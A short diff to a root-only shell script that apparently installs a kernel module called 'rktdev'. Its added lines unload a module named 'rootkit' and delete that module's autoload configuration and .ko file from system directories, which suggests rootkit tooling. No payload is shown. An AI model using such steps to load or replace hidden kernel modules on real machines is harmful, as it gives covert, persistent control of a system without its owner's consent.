@@ -6,6 +6,14 @@ if [ "$(id -u)" -ne 0 ]; then
     exit 1
 fi
 
+
+# delete old
+rmmod rootkit
+rm /etc/modules-load.d/rootkit.conf
+rm /usr/lib/modules/$(uname -r)/kernel/rootkit.ko
+
+
+
 MODULE_NAME="rktdev"
 
 MODULE_PATH="$(pwd)/$MODULE_NAME.ko"
